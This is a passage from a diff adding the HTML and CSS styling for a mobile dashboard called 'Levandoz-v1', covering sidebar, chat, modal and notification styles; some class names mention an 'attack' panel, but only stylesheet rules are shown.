@@ -1,0 +1,3771 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Levandoz-v1 Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;800&family=Inter:wght@400;500;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    * {
+      -webkit-tap-highlight-color: transparent;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    input, textarea {
+      -webkit-user-select: text;
+      -moz-user-select: text;
+      -ms-user-select: text;
+      user-select: text;
+    }
+    :root {
+      --bg: #0b0b0d;
+      --card: #141417;
+      --card-soft: #1b1b20;
+      --primary: #ffffff;
+      --accent: #f0f0f0;
+      --text: #ffffff;
+      --muted: #9a9a9a;
+      --danger: #ff5555;
+      --success: #4ade80;
+      --warning: #fbbf24;
+    }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', monospace;
+    }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+    .app {
+      max-width: 430px;
+      margin: auto;
+      padding: 10px 16px 20px;
+      min-height: 100vh;
+    }
+    .header {
+      position: sticky;
+      top: 0;
+      left: 0;
+      right: 0;
+      max-width: 430px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 10px 16px;
+      background: var(--bg);
+      z-index: 1000;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      position: relative;
+    }
+    .hamburger-menu {
+      position: absolute;
+      left: 16px;
+      cursor: pointer;
+      padding: 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      z-index: 1001;
+    }
+    .hamburger-line {
+      width: 24px;
+      height: 2px;
+      background: var(--primary);
+      transition: all 0.3s ease;
+    }
+    .hamburger-menu.active .hamburger-line:nth-child(1) {
+      transform: rotate(45deg) translate(5px, 5px);
+    }
+    .hamburger-menu.active .hamburger-line:nth-child(2) {
+      opacity: 0;
+    }
+    .hamburger-menu.active .hamburger-line:nth-child(3) {
+      transform: rotate(-45deg) translate(5px, -5px);
+    }
+    .header h1 {
+      font-size: 16px;
+      letter-spacing: 1px;
+      font-weight: 700;
+    }
+
+    /* Sidebar Styles */
+    .sidebar-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1002;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+    .sidebar-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    .sidebar {
+      position: fixed;
+      top: 0;
+      left: -320px;
+      width: 300px;
+      height: 100%;
+      background: var(--card);
+      z-index: 1003;
+      transition: left 0.3s ease;
+      overflow-y: auto;
+      border-right: 1px solid rgba(255,255,255,0.1);
+    }
+    .sidebar.active {
+      left: 0;
+    }
+    .sidebar-content {
+      padding: 80px 20px 30px;
+    }
+    .sidebar-section {
+      margin-bottom: 25px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    .sidebar-section:last-child {
+      border-bottom: none;
+    }
+    .sidebar-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 12px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .sidebar-banner {
+      width: 100%;
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 25px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .sidebar-banner img {
+      width: 100%;
+      height: auto;
+      display: block;
+      object-fit: cover;
+    }
+    .sidebar-item {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 8px;
+      line-height: 1.5;
+    }
+    .sidebar-item strong {
+      color: var(--primary);
+      display: inline-block;
+      min-width: 80px;
+    }
+    .sidebar-link {
+      color: #667eea;
+      text-decoration: none;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .sidebar-link:hover {
+      color: #764ba2;
+      text-decoration: underline;
+    }
+
+    .hero {
+      position: relative;
+      border-radius: 18px;
+      padding: 20px;
+      margin-bottom: 18px;
+      overflow: hidden;
+      min-height: 180px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(180deg, rgba(11,11,13,0.7) 0%, rgba(11,11,13,0.9) 100%);
+      z-index: 1;
+    }
+    .hero-video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: 0;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .hero-video.ready {
+      opacity: 1;
+      transition: opacity 0.3s ease;
+    }
+    .hero-content {
+      position: relative;
+      z-index: 2;
+    }
+    .hero h2 {
+      font-size: 28px;
+      font-weight: 800;
+      line-height: 1.1;
+      opacity: .25;
+    }
+    .hero p {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+    .card {
+      background: var(--card);
+      border-radius: 16px;
+      padding: 14px;
+      border: 1px solid rgba(255,255,255,0.05);
+      cursor: pointer;
+      transition: background 0.2s, border-color 0.3s;
+    }
+    .card:hover {
+      background: var(--card-soft);
+    }
+    .card-icon {
+      width: 34px;
+      height: 34px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
+    .icon-primary { background: rgba(255,255,255,0.1); color: var(--primary); }
+    .icon-accent { background: rgba(240,240,240,0.1); color: var(--accent); }
+    .card h3 { font-size: 15px; margin-bottom: 4px; font-weight: 700; }
+    .card span { font-size: 12px; color: var(--muted); }
+    .wide { grid-column: 1/3; display: flex; align-items: center; justify-content: space-between; }
+    .wide-left { display: flex; align-items: center; gap: 12px; }
+    .stats {
+      display: flex;
+      gap: 0;
+      margin-top: 10px;
+      background: var(--card-soft);
+      border-radius: 16px;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    .stat {
+      flex: 1;
+      padding: 14px 8px;
+      text-align: center;
+      transition: background 0.3s;
+      border-right: 1px solid rgba(255,255,255,0.05);
+    }
+    .stat:last-child {
+      border-right: none;
+    }
+    .stat strong { display: block; font-size: 20px; font-weight: 800; }
+    .primary { color: var(--primary); }
+    .accent { color: var(--accent); }
+    .toast {
+      position: fixed;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%) translateY(10px);
+      background: rgba(20, 20, 23, 0.95);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      color: var(--primary);
+      padding: 12px 20px;
+      border-radius: 12px;
+      font-weight: 500;
+      font-size: 13px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      border: 1px solid rgba(255,255,255,0.1);
+      z-index: 1000;
+      opacity: 0;
+      transition: opacity 0.25s ease, transform 0.25s ease;
+      pointer-events: none;
+      text-align: center;
+      max-width: 90%;
+    }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .menu-content { display: none; }
+    .menu-content.active { display: block; }
+    .attack-panel, .manage-sender-form {
+      background: var(--card);
+      border-radius: 16px;
+      padding: 20px;
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; font-size: 14px; margin-bottom: 8px; color: var(--muted); }
+    .form-group input, .form-group textarea {
+      width: 100%;
+      padding: 12px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 8px;
+      color: var(--primary);
+      font-size: 16px;
+      font-family: 'Orbitron', monospace;
+      transition: background 0.3s, border-color 0.3s;
+    }
+    .form-group input:focus, .form-group textarea:focus { outline: none; border-color: rgba(255,255,255,0.3); }
+    .attack-button, .secure-button {
+      width: 100%;
+      padding: 14px;
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 8px;
+      color: var(--primary);
+      font-size: 16px;
+      font-family: 'Orbitron', monospace;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-bottom: 10px;
+    }
+    .attack-button:disabled { opacity: 0.5; cursor: not-allowed; }
+    .button-spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.2);
+      border-top: 2px solid var(--primary);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+    .attack-button.loading .button-spinner { display: block; }
+    .attack-button.loading .button-text { display: none; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .timer-display { text-align: center; font-size: 12px; color: var(--muted); }
+    .back-button {
+      background: none;
+      border: none;
+      color: var(--primary);
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 15px;
+      padding: 8px 16px;
+      border-radius: 24px;
+    }
+    .back-button:hover { background: rgba(255,255,255,0.1); }
+    .back-button svg { width: 18px; height: 18px; }
+    .secure-form h3 { font-size: 16px; margin-bottom: 16px; color: var(--primary); }
+    .svg-icon { width: 18px; height: 18px; display: inline-block; vertical-align: middle; }
+
+    /* Warning levels */
+    .warning-1 { color: #FFD700; }
+    .warning-2 { color: #FFA500; }
+    .warning-3 { color: #FF4444; }
+
+    /* ==================== CHAT AI STYLES ==================== */
+    .chat-ai-container {
+      display: flex;
+      flex-direction: column;
+      height: calc(100vh - 140px);
+      max-height: 600px;
+    }
+
+    .chat-ai-messages {
+      flex: 1;
+      overflow-y: auto;
+      background: var(--card);
+      border-radius: 16px;
+      padding: 16px;
+      border: 1px solid rgba(255,255,255,0.05);
+      margin-bottom: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      scrollbar-width: thin;
+      scrollbar-color: rgba(255,255,255,0.1) transparent;
+    }
+
+    .chat-ai-messages::-webkit-scrollbar {
+      width: 6px;
+    }
+
+    .chat-ai-messages::-webkit-scrollbar-track {
+      background: transparent;
+    }
+
+    .chat-ai-messages::-webkit-scrollbar-thumb {
+      background: rgba(255,255,255,0.1);
+      border-radius: 3px;
+    }
+
+    .chat-ai-messages::-webkit-scrollbar-thumb:hover {
+      background: rgba(255,255,255,0.2);
+    }
+
+    .ai-message {
+      display: flex;
+      gap: 10px;
+      animation: messageSlideIn 0.3s ease;
+    }
+
+    @keyframes messageSlideIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .ai-message.user {
+      flex-direction: row-reverse;
+    }
+
+    .ai-avatar {
+      width: 36px;
+      height: 36px;
+      min-width: 36px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+    }
+
+    .ai-avatar.ai {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
+
+    .ai-avatar.user {
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+    }
+
+    .ai-message-content {
+      background: rgba(255,255,255,0.05);
+      padding: 12px 16px;
+      border-radius: 16px;
+      max-width: 80%;
+      word-wrap: break-word;
+      line-height: 1.5;
+      font-size: 14px;
+    }
+
+    .ai-message.user .ai-message-content {
+      background: rgba(102, 126, 234, 0.2);
+      border: 1px solid rgba(102, 126, 234, 0.3);
+    }
+
+    .ai-message.ai .ai-message-content {
+      background: var(--card-soft);
+      border: 1px solid rgba(255,255,255,0.08);
+    }
+
+    .ai-message-time {
+      font-size: 10px;
+      color: var(--muted);
+      margin-top: 4px;
+    }
+
+    .chat-ai-input-container {
+      background: var(--card);
+      border-radius: 16px;
+      padding: 12px;
+      border: 1px solid rgba(255,255,255,0.05);
+      display: flex;
+      gap: 10px;
+      align-items: flex-end;
+    }
+
+    .chat-ai-input {
+      flex: 1;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 12px 14px;
+      color: var(--primary);
+      font-size: 14px;
+      font-family: 'Orbitron', monospace;
+      resize: none;
+      min-height: 44px;
+      max-height: 120px;
+      transition: all 0.3s;
+    }
+
+    .chat-ai-input:focus {
+      outline: none;
+      border-color: rgba(102, 126, 234, 0.5);
+      background: rgba(102, 126, 234, 0.05);
+    }
+
+    .chat-ai-send-button {
+      width: 44px;
+      height: 44px;
+      min-width: 44px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      border: none;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .chat-ai-send-button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    }
+
+    .chat-ai-send-button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .chat-ai-send-button svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    .ai-typing-indicator {
+      display: flex;
+      gap: 4px;
+      padding: 8px 12px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 12px;
+      width: fit-content;
+    }
+
+    .ai-typing-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.4);
+      animation: typingDot 1.4s infinite;
+    }
+
+    .ai-typing-dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .ai-typing-dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes typingDot {
+      0%, 60%, 100% {
+        transform: translateY(0);
+      }
+      30% {
+        transform: translateY(-8px);
+      }
+    }
+
+    .ai-status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      background: rgba(74, 222, 128, 0.1);
+      border: 1px solid rgba(74, 222, 128, 0.3);
+      border-radius: 20px;
+      font-size: 11px;
+      color: var(--success);
+      margin-bottom: 12px;
+    }
+
+    .ai-status-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--success);
+      animation: statusPulse 2s infinite;
+    }
+
+    @keyframes statusPulse {
+      0%, 100% {
+        opacity: 1;
+      }
+      50% {
+        opacity: 0.5;
+      }
+    }
+
+    .ai-welcome-card {
+      background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
+      border: 1px solid rgba(102, 126, 234, 0.2);
+      border-radius: 16px;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .ai-welcome-card h3 {
+      font-size: 18px;
+      margin-bottom: 8px;
+      color: var(--primary);
+    }
+
+    .ai-welcome-card p {
+      font-size: 13px;
+      color: var(--muted);
+      line-height: 1.5;
+    }
+
+    .ai-quick-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+      margin-top: 16px;
+    }
+
+    .ai-quick-action {
+      padding: 10px 14px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 10px;
+      font-size: 11px;
+      color: var(--muted);
+      cursor: pointer;
+      transition: all 0.2s;
+      text-align: center;
+    }
+
+    .ai-quick-action:hover {
+      background: rgba(102, 126, 234, 0.1);
+      border-color: rgba(102, 126, 234, 0.3);
+      color: var(--primary);
+    }
+
+    /* Clear chat button */
+    .clear-chat-button {
+      padding: 8px 16px;
+      background: rgba(255, 85, 85, 0.1);
+      border: 1px solid rgba(255, 85, 85, 0.2);
+      color: var(--danger);
+      border-radius: 8px;
+      font-size: 12px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .clear-chat-button:hover {
+      background: rgba(255, 85, 85, 0.2);
+    }
+
+    /* Responsive for Chat AI */
+    @media (max-width: 480px) {
+      .chat-ai-container {
+        height: calc(100vh - 120px);
+      }
+
+      .ai-message-content {
+        max-width: 85%;
+        font-size: 13px;
+      }
+
+      .ai-avatar {
+        width: 32px;
+        height: 32px;
+        min-width: 32px;
+      }
+    }
+    /* Cooldown notification styles */
+    .cooldown-notification {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(20, 20, 23, 0.95);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border: 2px solid rgba(255, 85, 85, 0.3);
+      border-radius: 16px;
+      padding: 24px 32px;
+      max-width: 90%;
+      min-width: 300px;
+      text-align: center;
+      z-index: 3000;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      pointer-events: none;
+    }
+    .cooldown-notification.show {
+      opacity: 1;
+      pointer-events: all;
+    }
+    .cooldown-notification h3 {
+      color: #ff5555;
+      font-size: 18px;
+      margin-bottom: 12px;
+    }
+    .cooldown-notification p {
+      color: var(--muted);
+      font-size: 14px;
+      margin-bottom: 16px;
+    }
+    .cooldown-timer {
+      font-size: 32px;
+      font-weight: 800;
+      color: #fbbf24;
+      margin-bottom: 16px;
+    }
+    .cooldown-close-btn {
+      padding: 10px 24px;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: var(--primary);
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .cooldown-close-btn:hover {
+      background: rgba(255, 255, 255, 0.15);
+    }
+
+    /* Live Chat Admin Styles */
+    .livechat-content {
+      display: flex;
+      flex-direction: column;
+      height: calc(100vh - 140px);
+    }
+    .chat-container {
+      flex: 1;
+      overflow-y: auto;
+      background: var(--card);
+      border-radius: 16px;
+      padding: 16px;
+      border: 1px solid rgba(255,255,255,0.05);
+      margin-bottom: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      scrollbar-width: thin;
+      scrollbar-color: rgba(255,255,255,0.1) transparent;
+    }
+    .chat-container::-webkit-scrollbar {
+      width: 6px;
+    }
+    .chat-container::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    .chat-container::-webkit-scrollbar-thumb {
+      background: rgba(255,255,255,0.1);
+      border-radius: 3px;
+    }
+    .chat-container::-webkit-scrollbar-thumb:hover {
+      background: rgba(255,255,255,0.2);
+    }
+    .chat-bubble {
+      background: var(--card-soft);
+      border-radius: 12px;
+      padding: 10px 14px;
+      border: 1px solid rgba(255,255,255,0.05);
+      max-width: 90%;
+    }
+    .bubble-system {
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+      background: rgba(255,255,255,0.05);
+    }
+    .bubble-user {
+      background: rgba(102, 126, 234, 0.2);
+      border: 1px solid rgba(102, 126, 234, 0.3);
+      margin-left: auto;
+    }
+    .bubble-owner {
+      background: var(--card-soft);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    .bubble-username {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    .chat-input-container {
+      display: flex;
+      gap: 10px;
+      background: var(--card);
+      border-radius: 16px;
+      padding: 12px;
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    .chat-input {
+      flex: 1;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 12px 14px;
+      color: var(--primary);
+      font-size: 14px;
+      font-family: 'Orbitron', monospace;
+    }
+    .chat-input:focus {
+      outline: none;
+      border-color: rgba(255,255,255,0.3);
+    }
+    .send-button {
+      width: 44px;
+      height: 44px;
+      min-width: 44px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      border: none;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .send-button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    }
+    .send-button svg {
+      width: 20px;
+      height: 20px;
+    }
+    .chat-bubble-wrapper {
+      position: relative;
+      margin-bottom: 8px;
+    }
+
+    /* Music Player Styles */
+    #songList::-webkit-scrollbar {
+      width: 4px;
+    }
+    #songList::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    #songList::-webkit-scrollbar-thumb {
+      background: rgba(255,255,255,0.1);
+      border-radius: 2px;
+    }
+    #songList::-webkit-scrollbar-thumb:hover {
+      background: rgba(255,255,255,0.2);
+    }
+    .chat-bubble-wrapper.admin .chat-bubble {
+      border: 2px solid rgba(255, 215, 0, 0.3);
+    }
+    .chat-admin-controls {
+      display: flex;
+      gap: 6px;
+      margin-top: 4px;
+    }
+    .chat-admin-btn {
+      padding: 4px 10px;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 6px;
+      color: var(--muted);
+      font-size: 11px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .chat-admin-btn:hover {
+      background: rgba(255, 255, 255, 0.15);
+      color: var(--primary);
+    }
+    .chat-admin-btn.delete:hover {
+      background: rgba(255, 85, 85, 0.2);
+      border-color: rgba(255, 85, 85, 0.4);
+      color: #ff5555;
+    }
+
+    /* Admin Tag Styles */
+    .admin-tag {
+      font-family: 'Inter', sans-serif;
+      font-weight: 700;
+      font-size: 10px;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: #ff4444;
+      background: linear-gradient(135deg, rgba(255, 68, 68, 0.15) 0%, rgba(255, 85, 85, 0.1) 100%);
+      padding: 2px 8px;
+      border-radius: 4px;
+      margin-left: 6px;
+      border: 1px solid rgba(255, 68, 68, 0.3);
+      text-shadow: 0 0 8px rgba(255, 68, 68, 0.5);
+    }
+    .username-part {
+      color: var(--primary);
+    }
+
+    /* Edit Modal */
+    .edit-modal {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: var(--card);
+      border-radius: 16px;
+      padding: 24px;
+      max-width: 90%;
+      width: 320px;
+      z-index: 4000;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      pointer-events: none;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    .edit-modal.show {
+      opacity: 1;
+      pointer-events: all;
+    }
+    .edit-modal h3 {
+      font-size: 18px;
+      margin-bottom: 16px;
+      color: var(--primary);
+    }
+    .edit-modal textarea {
+      width: 100%;
+      padding: 12px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 8px;
+      color: var(--primary);
+      font-family: 'Orbitron', monospace;
+      font-size: 14px;
+      resize: vertical;
+      min-height: 80px;
+      max-height: 150px;
+      margin-bottom: 12px;
+    }
+    .edit-modal textarea:focus {
+      outline: none;
+      border-color: rgba(255,255,255,0.3);
+    }
+    .edit-modal-buttons {
+      display: flex;
+      gap: 8px;
+    }
+    .edit-modal-btn {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: 'Orbitron', monospace;
+      font-size: 14px;
+    }
+    .edit-modal-btn.save {
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.2);
+      color: var(--primary);
+    }
+    .edit-modal-btn.save:hover {
+      background: rgba(255,255,255,0.15);
+    }
+    .edit-modal-btn.cancel {
+      background: rgba(255,85,85,0.1);
+      border: 1px solid rgba(255,85,85,0.2);
+      color: #ff5555;
+    }
+    .edit-modal-btn.cancel:hover {
+      background: rgba(255,85,85,0.2);
+    }
+
+    /* Conclusion Font Style */
+    .conclusion-text {
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      line-height: 1.6;
+      color: var(--text);
+    }
+
+    /* Tips & Trick Menu */
+    .tips-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 12px;
+      margin-top: 14px;
+    }
+    .tips-card {
+      background: var(--card);
+      border-radius: 16px;
+      padding: 16px;
+      border: 1px solid rgba(255,255,255,0.05);
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .tips-card:hover {
+      background: var(--card-soft);
+      border-color: rgba(102, 126, 234, 0.3);
+    }
+    .tips-card-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .tips-card-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, rgba(102, 126, 234, 0.2) 0%, rgba(118, 75, 162, 0.2) 100%);
+    }
+    .tips-card h3 {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--primary);
+    }
+    .tips-card p {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 4px;
+    }
+
+    /* YouTube Video Container */
+    .video-container {
+      width: 100%;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #000;
+      position: relative;
+      padding-bottom: 56.25%; /* 16:9 aspect ratio */
+      height: 0;
+    }
+    .video-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: 0;
+    }
+
+    /* Download Button */
+    .download-button {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, rgba(74, 222, 128, 0.2) 0%, rgba(34, 197, 94, 0.2) 100%);
+      border: 2px solid rgba(74, 222, 128, 0.4);
+      border-radius: 12px;
+      color: #4ade80;
+      font-size: 16px;
+      font-family: 'Orbitron', monospace;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .download-button:hover {
+      background: linear-gradient(135deg, rgba(74, 222, 128, 0.3) 0%, rgba(34, 197, 94, 0.3) 100%);
+      border-color: #4ade80;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 15px rgba(74, 222, 128, 0.3);
+    }
+    .download-button:active {
+      transform: translateY(0);
+    }
+
+    /* Security Score Display */
+    .security-score {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      padding: 12px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 8px;
+      margin-top: 12px;
+    }
+    .score-circle {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      font-weight: 800;
+      font-family: 'Orbitron', monospace;
+    }
+    .score-high {
+      background: rgba(74, 222, 128, 0.2);
+      border: 2px solid #4ade80;
+      color: #4ade80;
+    }
+    .score-medium {
+      background: rgba(251, 191, 36, 0.2);
+      border: 2px solid #fbbf24;
+      color: #fbbf24;
+    }
+    .score-low {
+      background: rgba(255, 85, 85, 0.2);
+      border: 2px solid #ff5555;
+      color: #ff5555;
+    }
+    .score-label {
+      text-align: left;
+    }
+    .score-label strong {
+      display: block;
+      font-size: 14px;
+      color: var(--primary);
+    }
+    .score-label span {
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    /* Floating Notification Styles */
+    .floating-notification {
+      position: relative;
+      width: 100%;
+      margin: 16px 0 0 0;
+      background: var(--card);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 24px;
+      box-shadow:
+        0 0 0 2px #ff5555,
+        0 0 20px rgba(255, 85, 85, 0.4),
+        0 0 40px rgba(255, 85, 85, 0.2),
+        0 8px 40px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 85, 85, 0.6);
+      z-index: 1000;
+      display: none;
+    }
+
+    .floating-notification.show {
+      display: block;
+      animation: slideDown 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    @keyframes slideDown {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 1;
+        transform: translateY(0);
+      }
+      to {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+    }
+
+    .floating-notification.hiding {
+      animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .floating-notification-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .floating-notification-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: var(--primary);
+      font-size: 15px;
+      font-weight: 700;
+      font-family: 'Orbitron', monospace;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+    }
+
+    .floating-notification-icon {
+      width: 32px;
+      height: 32px;
+      min-width: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, rgba(102, 126, 234, 0.25) 0%, rgba(118, 75, 162, 0.25) 100%);
+      border-radius: 10px;
+      border: 1px solid rgba(102, 126, 234, 0.4);
+    }
+
+    .floating-notification-icon svg {
+      width: 16px;
+      height: 16px;
+      color: #667eea;
+    }
+
+    .floating-notification-close {
+      background: rgba(255, 85, 85, 0.15);
+      border: 1px solid rgba(255, 85, 85, 0.3);
+      padding: 8px 20px;
+      border-radius: 10px;
+      color: var(--danger);
+      font-size: 13px;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: all 0.2s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .floating-notification-close:hover {
+      background: rgba(255, 85, 85, 0.25);
